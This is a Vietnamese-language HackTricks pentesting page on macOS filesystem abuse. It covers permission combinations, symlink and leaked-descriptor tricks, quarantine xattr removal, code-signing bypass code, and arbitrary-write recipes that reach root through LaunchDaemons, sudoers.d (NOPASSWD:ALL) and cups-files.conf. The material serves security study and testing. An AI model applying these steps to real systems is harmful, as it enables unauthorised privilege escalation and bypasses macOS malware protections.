# Thủ thuật với filesystem trên macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Các tổ hợp quyền POSIX

Đối với **thư mục**, ba bit quyền có ý nghĩa khác với khi áp dụng cho tệp thông thường. `chmod(1)` gọi bit thực thi là "**search**" khi áp dụng cho thư mục:<sup>[[2]](#references)</sup>

> `0100` Với tệp, cho phép chủ sở hữu thực thi. Với thư mục, cho phép chủ sở hữu **tìm kiếm** trong thư mục.

- **read** - bạn có thể **liệt kê** các mục trong thư mục (xem tên).
- **write** - bạn có thể **tạo, đổi tên và xóa các mục** trong thư mục. Lưu ý đây là thuộc tính của thư mục *chứa*, không phải của tệp: bạn có thể xóa một tệp mà mình không thể đọc hoặc ghi, miễn là bạn có quyền ghi vào thư mục cha của nó.
  - Để xóa **thư mục con**, thư mục đó phải trống; việc này đòi hỏi bạn có đủ quyền để xóa mọi thứ bên trong.
  - Nếu thư mục có **sticky bit** (`S_ISVTX`, như `/tmp`), quyền này bị hạn chế — POSIX quy định rằng tiến trình chỉ có thể xóa hoặc đổi tên tệp trong thư mục đó nếu nó sở hữu tệp, sở hữu thư mục hoặc có quyền thích hợp.<sup>[[1]](#references)</sup>
- **execute / search** - bạn **được phép duyệt qua** thư mục. Việc phân giải tên đường dẫn tìm từng thành phần "trong thư mục được thành phần đứng trước nó chỉ định", vì vậy **mất quyền search trên bất kỳ thành phần nào trong tiền tố đường dẫn sẽ khiến mọi thứ phía dưới không thể truy cập bằng đường dẫn**, ngay cả khi tệp cuối cùng cho phép mọi người đọc.<sup>[[1]](#references)</sup>

### Các tổ hợp nguy hiểm

**Cách ghi đè tệp/thư mục thuộc sở hữu của root**, khi:

- Chủ sở hữu của một **thư mục cha** trong đường dẫn là người dùng
- Chủ sở hữu của một **thư mục cha** trong đường dẫn là **nhóm người dùng** có **quyền ghi**
- Một **nhóm** người dùng có **quyền ghi** vào **tệp**

Với bất kỳ tổ hợp nào ở trên, kẻ tấn công có thể **chèn** một **liên kết tượng trưng/liên kết cứng** vào đường dẫn dự kiến để có được khả năng ghi tùy ý với đặc quyền cao.

### Trường hợp đặc biệt: thư mục root chỉ có R+X

Điều này xuất phát trực tiếp từ quy tắc phân giải tên đường dẫn ở trên. Nếu một **thư mục chỉ cấp R+X cho root**, thì mọi người khác đều không thể truy cập các tệp bên trong *bằng đường dẫn* — nhưng **các bit quyền riêng của tệp vẫn có thể cho phép truy cập rộng rãi**. Chỉ có thư mục đang ngăn cản việc đó.

Vì vậy, bất kỳ thủ thuật nào giúp đưa tệp **ra khỏi thư mục đó** — chẳng hạn một tiến trình có đặc quyền **di chuyển/đổi tên/sao chép** đường dẫn do kẻ tấn công chọn đến một vị trí mà bạn *có thể* duyệt qua — sẽ cho phép đọc tùy ý mà không cần vượt qua quyền của chính tệp:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Tìm các tiến trình có đặc quyền di chuyển file (trình cài đặt, trình xoay vòng log, trình thu thập sự cố/chẩn đoán, tính năng sao lưu và "xuất") chấp nhận đường dẫn nguồn do người dùng có ít đặc quyền hơn cung cấp.

## Symbolic Link / Hard Link

### File/thư mục có quyền truy cập rộng

Nếu một tiến trình có đặc quyền đang ghi dữ liệu vào **file** mà người dùng có ít đặc quyền hơn có thể **kiểm soát**, hoặc file đó có thể đã được người dùng có ít đặc quyền hơn **tạo từ trước**, người dùng chỉ cần **trỏ file đó đến một file khác** thông qua Symbolic Link hoặc Hard Link; tiến trình có đặc quyền sẽ ghi vào file đó.

Kiểm tra các phần khác để tìm nơi kẻ tấn công có thể **lạm dụng quyền ghi tùy ý để leo thang đặc quyền**.

### Open `O_NOFOLLOW`

Theo [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Nếu dùng `O_NOFOLLOW` trong mask và file đích được truyền cho `open()` là symbolic link, thì `open()` sẽ thất bại."* Chỉ thành phần **cuối cùng** được kiểm tra — mọi thành phần **trung gian** vẫn được phân giải và đi theo. Vì vậy, nhà phát triển có thể đã "bảo vệ" thao tác ghi bằng `O_NOFOLLOW`, nhưng vẫn có thể bị tấn công bằng cách đặt một symlink trong bất kỳ **thư mục cha** nào của đường dẫn đích.<sup>[[3]](#references)</sup>

Cùng trang man đó mô tả các flag thực sự khắc phục lỗ hổng này:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"nếu ... bất kỳ thành phần nào trong đường dẫn được truyền cho `open()` là symbolic link, thì `open()` sẽ thất bại."*
- **`O_RESOLVE_BENEATH`** — *"nếu ... việc phân giải đường dẫn được chỉ định thoát khỏi thư mục gắn với fd, thì `openat()` sẽ thất bại."*

Nếu không, các cách còn lại để ngăn việc tráo symlink giữa chừng là dùng `openat()` tương đối với một directory FD đã được xác thực, hoặc dùng `realpath()` rồi xác thực lại.

## .fileloc

Các file có phần mở rộng **`.fileloc`** có thể trỏ đến ứng dụng hoặc binary khác, vì vậy khi được mở, ứng dụng/binary đó sẽ được thực thi.\
Ví dụ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Nếu lệnh gọi `open` không có cờ `O_CLOEXEC`, file descriptor sẽ được tiến trình con kế thừa. Vì vậy, nếu một tiến trình có đặc quyền mở một file có đặc quyền rồi thực thi một tiến trình do attacker kiểm soát, attacker sẽ **kế thừa FD trỏ tới file có đặc quyền**.

Ví dụ điển hình là **`DYLD_PRINT_TO_FILE` LPE trong OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` vẫn xử lý `DYLD_PRINT_TO_FILE=/path` ngay cả trong **các binary bị hạn chế (suid root)**, vì biến cụ thể đó được phân tích bên ngoài `processDyldEnvironmentVariable()`.
- Nó gọi `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, nên **tạo một file thuộc sở hữu của root tại đường dẫn bất kỳ**.
- FD **không bao giờ được đóng và không có cờ close-on-exec**, vì vậy mọi tiến trình con của binary suid đều kế thừa **FD có quyền ghi vào file thuộc sở hữu của root**.
- Chạy, chẳng hạn, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` rồi đọc số FD được kế thừa trong tiến trình con sẽ cho phép ghi tùy ý vào file thuộc sở hữu của root; thậm chí `fcntl(fd, F_SETFL, 0)` còn xóa `O_APPEND`, cho phép ghi đè thay vì ghi nối tiếp.

Tình huống tương tự xuất hiện bất cứ khi nào một tiến trình có đặc quyền mở file **trước khi** `exec` một thứ gì đó do bạn kiểm soát (công cụ trợ giúp, trình soạn thảo kiểu `crontab` được gọi qua `$EDITOR`, file log/debug được mở từ đường dẫn trong biến môi trường...). Liệt kê các FD bạn đã kế thừa bằng:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Bất kỳ thứ gì lớn hơn 2 trỏ đến một tệp mà bạn không thể tự mở đều là một primitive ghi tùy ý (hoặc đọc tùy ý).

## Tránh các thủ thuật xattrs quarantine

### Xóa nó

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### cờ uchg / uchange / uimmutable

Nếu một file/folder có thuộc tính bất biến này thì sẽ không thể đặt xattr lên nó.

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Các hệ thống tệp không hỗ trợ xattr

Không phải hệ thống tệp nào macOS có thể gắn kết cũng lưu **extended attributes** một cách tự nhiên. HFS+ và APFS có hỗ trợ; **FAT32, exFAT và (hầu hết) các điểm gắn kết NFS thì không** — macOS mô phỏng chúng bằng cách ghi một tệp phụ AppleDouble có tên `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Điều này quan trọng đối với quarantine, vì xattr chỉ được giữ lại nếu nó thực sự có thể được ghi **và đọc lại** từ cùng một volume:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Nếu volume sau đó được đọc thông qua một đường dẫn bỏ qua companion `._` (hoặc companion bị loại bỏ/xóa), tệp sẽ đến **mà không có quarantine flag** — và một `.app` không được quarantine là đủ để thoát khỏi App Sandbox, như đã đề cập trong [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### Hành vi quarantine của writeextattr ACL và AppleDouble

Để xem ví dụ về ACL `writeextattr`, cơ chế AppleDouble `com.apple.acl.text`, cũng như các bước tạo và xác thực sidecar, hãy xem [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md).

## Bypass kiểm tra chữ ký

### Bypass kiểm tra platform binary

Một số kiểm tra bảo mật xác minh binary có phải là **platform binary** hay không, chẳng hạn để cho phép kết nối với một dịch vụ XPC. Tuy nhiên, như đã trình bày trong bài viết về bypass tại https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, có thể bypass bước kiểm tra này bằng cách lấy một platform binary (như /bin/ls) rồi inject exploit thông qua dyld bằng biến môi trường `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass các flag `CS_REQUIRE_LV` và `CS_FORCED_LV`

Một binary đang thực thi có thể sửa các flag của chính nó để bypass kiểm tra bằng đoạn code như sau:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Vượt qua chữ ký mã

Các gói chứa tệp **`_CodeSignature/CodeResources`**, trong đó có **hash** của từng **tệp** trong **gói**. Lưu ý rằng hash của CodeResources cũng được **nhúng trong tệp thực thi**, vì vậy chúng ta cũng không thể sửa nó.

Tuy nhiên, có một số tệp sẽ không được kiểm tra chữ ký. Các tệp này có khóa `omit` trong plist, chẳng hạn như:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Có thể tính chữ ký của một tài nguyên từ CLI bằng:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Gắn kết dmgs

Người dùng có thể gắn kết một dmg tùy chỉnh được tạo ra ngay cả lên trên một số thư mục hiện có. Đây là cách bạn có thể tạo một gói dmg tùy chỉnh với nội dung tùy chỉnh:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Thông thường, macOS mount disk bằng cách giao tiếp với Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (được cung cấp bởi `/usr/libexec/diskarbitrationd`). Nếu thêm tham số `-d` vào file plist của LaunchDaemons rồi khởi động lại, log sẽ được lưu vào `/var/log/diskarbitrationd.log`.\
Tuy nhiên, có thể dùng các công cụ như `hdik` và `hdiutil` để giao tiếp trực tiếp với kext `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic shell scripts

Nếu script của bạn có thể được diễn giải như một **shell script**, bạn có thể ghi đè shell script **`/etc/periodic/daily/999.local`**, vốn sẽ được chạy mỗi ngày.

Bạn có thể **giả lập** việc chạy script này bằng lệnh: **`sudo periodic daily`**

### Daemons

Tạo một **LaunchDaemon** tùy ý như **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** với một plist chạy script tùy ý như:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Chỉ cần tạo script `/Applications/Scripts/privesc.sh` chứa các **lệnh** bạn muốn chạy với quyền root.

### Tệp Sudoers

Nếu có **arbitrary write**, bạn có thể tạo một tệp trong thư mục **`/etc/sudoers.d/`** để cấp cho mình quyền **sudo**.

### Tệp PATH

Tệp **`/etc/paths`** là một trong những nơi chính thiết lập biến môi trường PATH. Bạn phải có quyền root để ghi đè tệp này, nhưng nếu một **privileged process** đang chạy một **lệnh không kèm đường dẫn đầy đủ**, bạn có thể **hijack** lệnh đó bằng cách chỉnh sửa tệp này.

Bạn cũng có thể ghi tệp vào **`/etc/paths.d`** để thêm các thư mục mới vào biến môi trường `PATH`.

### cups-files.conf

Kỹ thuật này đã được sử dụng trong [bài viết này](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Tạo tệp `/etc/cups/cups-files.conf` với nội dung sau:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

This sẽ tạo file `/etc/sudoers.d/lpe` với quyền 777. Phần rác thêm vào cuối nhằm kích hoạt việc tạo error log.

Sau đó, ghi cấu hình cần thiết để leo thang đặc quyền vào `/etc/sudoers.d/lpe`, chẳng hạn `%staff ALL=(ALL) NOPASSWD:ALL`.

Tiếp theo, sửa lại file `/etc/cups/cups-files.conf`, chỉ định `LogFilePerm 700` để file sudoers mới hợp lệ khi gọi `cupsctl`.

### Sandbox Escape

Có thể thoát khỏi macOS sandbox bằng FS arbitrary write. Để xem một số ví dụ, hãy kiểm tra trang [macOS Auto Start](../../../../macos-auto-start-locations.md), nhưng cách phổ biến là ghi một file tùy chọn của Terminal vào `~/Library/Preferences/com.apple.Terminal.plist` để file này thực thi một lệnh khi khởi động, rồi gọi nó bằng `open`.

## Tạo file có thể ghi với tư cách người dùng khác

Một primitive privesc rất phổ biến là **khiến một process có đặc quyền tạo file cho bạn** trong một thư mục do bạn kiểm soát, rồi giữ **quyền ghi** đối với file đó. Cần có hai yếu tố:

1. Một thư mục thuộc sở hữu của bạn (hoặc nơi bạn có thể đặt **ACL có thể kế thừa**), để mọi thứ được tạo bên trong đều kế thừa quyền của bạn.
2. Một process có đặc quyền/`suid` có thể được chỉ định **nơi** tạo file — thường thông qua một biến môi trường debug/logging, file cấu hình hoặc XPC API của helper.

Yếu tố **ACL có thể kế thừa** giúp bạn có thể ghi vào file được tạo, dù file thuộc sở hữu của người dùng khác. Các cờ kế thừa `file_inherit` / `directory_inherit` được mô tả trong [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Giờ đây, mọi file mà một tiến trình có đặc quyền tạo bên trong `$DIRNAME` đều **có thể được bạn ghi vào**. Nếu thư mục đó cũng là một vị trí mà sau này được **thực thi với quyền root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, thư mục LaunchDaemon...), thì đây là cách leo thang trực tiếp lên root. Xem các phần [Sudoers File](#sudoers-file) và [cups-files.conf](#cups-filesconf) ở trên để biết cần ghi gì vào file sau khi có được nó.

Để xem ví dụ đầy đủ về chuỗi “biến môi trường khiến một tiến trình root tạo file, rồi FD bị leak cho bạn”, hãy xem [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) ở trên.

## Bộ nhớ chia sẻ POSIX

**Bộ nhớ chia sẻ POSIX** cho phép các tiến trình trong hệ điều hành tuân thủ POSIX truy cập một vùng bộ nhớ chung, giúp giao tiếp nhanh hơn so với các phương thức giao tiếp liên tiến trình khác. Cách này bao gồm việc tạo hoặc mở một đối tượng bộ nhớ chia sẻ bằng `shm_open()`, đặt kích thước bằng `ftruncate()` và ánh xạ nó vào không gian địa chỉ của tiến trình bằng `mmap()`. Sau đó, các tiến trình có thể đọc và ghi trực tiếp vào vùng bộ nhớ này. Để quản lý quyền truy cập đồng thời và ngăn dữ liệu bị hỏng, người ta thường dùng các cơ chế đồng bộ hóa như mutex hoặc semaphore. Cuối cùng, các tiến trình hủy ánh xạ và đóng bộ nhớ chia sẻ bằng `munmap()` và `close()`, đồng thời có thể xóa đối tượng bộ nhớ bằng `shm_unlink()`. Hệ thống này đặc biệt hiệu quả để thực hiện IPC nhanh chóng trong các môi trường cần nhiều tiến trình truy cập dữ liệu chia sẻ với tốc độ cao.

<details>

<summary>Ví dụ mã Producer</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Ví dụ mã Consumer</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** là một tính năng bảo mật được giới thiệu trong macOS nhằm tăng cường độ an toàn và độ tin cậy của **các thao tác với file descriptor** trong ứng dụng người dùng. Các guarded descriptor này cho phép gắn những hạn chế cụ thể, hay còn gọi là "guard", với file descriptor; kernel sẽ thực thi các hạn chế đó.

Tính năng này đặc biệt hữu ích để ngăn một số dạng lỗ hổng bảo mật, chẳng hạn như **truy cập file trái phép** hoặc **race condition**. Những lỗ hổng này xảy ra, ví dụ, khi một thread truy cập file descriptor và **cho phép một thread dễ bị tổn thương khác truy cập vào đó**, hoặc khi một file descriptor được **kế thừa** bởi một tiến trình con dễ bị tổn thương. Một số hàm liên quan đến chức năng này:

- `guarded_open_np`: Mở file descriptor kèm guard
- `guarded_close_np`: Đóng file descriptor
- `change_fdguard_np`: Thay đổi các cờ guard trên descriptor (thậm chí xóa bỏ cơ chế bảo vệ guard)

## References

- [1] [POSIX.1-2024 — Định nghĩa cơ sở, Ch. 4 (Quyền truy cập file, Bảo vệ thư mục, Phân giải pathname)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` trang man](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` trang man](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - Lỗ hổng leo thang đặc quyền cục bộ DYLD_PRINT_TO_FILE trên OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Những hệ thống file và dịch vụ cloud nào giữ lại extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - Kỷ nguyên mới của các vụ thoát khỏi macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Khám phá các lỗ hổng của Apple: Câu chuyện kiểm tra diskarbitrationd và storagekitd, Phần 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
